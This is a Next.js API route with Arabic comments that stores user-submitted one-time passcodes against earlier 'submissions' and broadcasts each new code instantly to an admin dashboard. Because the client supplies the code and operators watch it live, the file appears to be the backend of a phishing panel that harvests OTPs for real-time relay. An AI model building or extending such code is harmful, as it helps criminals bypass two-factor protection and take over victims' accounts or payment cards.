import { NextRequest, NextResponse } from 'next/server';
import { getAdminClient } from '@/lib/supabase';
import { getIO } from '@/lib/socket';

interface OtpBody {
  submissionId: string;
  clientId: string;
  reference?: string;
  code?: string;
}

// إدراج رمز تحقق OTP جديد مرتبط بطلب موجود
export async function POST(req: NextRequest) {
  try {
    const body = (await req.json()) as OtpBody;

    if (!body.submissionId || !body.clientId) {
      return NextResponse.json(
        { error: 'معرّف الطلب والعميل مطلوبان' },
        { status: 400 }
      );
    }
    if (!body.code || !/^\d{4,8}$/.test(body.code)) {
      return NextResponse.json(
        { error: 'رمز التحقق يجب أن يكون 4-8 أرقام' },
        { status: 400 }
      );
    }

    const admin = getAdminClient();

    // استرجاع المرجع من الطلب إن لم يُمرّر
    let reference = body.reference;
    if (!reference) {
      const { data: sub } = await admin
        .from('submissions')
        .select('reference')
        .eq('id', body.submissionId)
        .single();
      reference = sub?.reference || null;
    }

    const { data, error } = await admin
      .from('otp_codes')
      .insert({
        client_id: body.clientId,
        submission_id: body.submissionId,
        reference,
        code: body.code,
        status: 'pending',
      })
      .select('id,reference')
      .single();

    if (error || !data) {
      return NextResponse.json({ error: 'فشل حفظ رمز التحقق' }, { status: 500 });
    }

    // بثّ لحظي للوحة الإدارة: إدخال OTP جديد
    const io = getIO();
    if (io) {
      io.to('admins').emit('admin:new_entry', {
        type: 'otp',
        clientId: body.clientId,
        submissionId: body.submissionId,
        entryId: data.id,
        reference: data.reference,
        hasOtp: true,
        created_at: new Date().toISOString(),
      });
    }

    return NextResponse.json({ ok: true, otpId: data.id, reference: data.reference });
  } catch {
    return NextResponse.json({ error: 'خطأ في الخادم' }, { status: 500 });
  }
}

export async function OPTIONS() {
  return new NextResponse(null, { status: 204 });
}
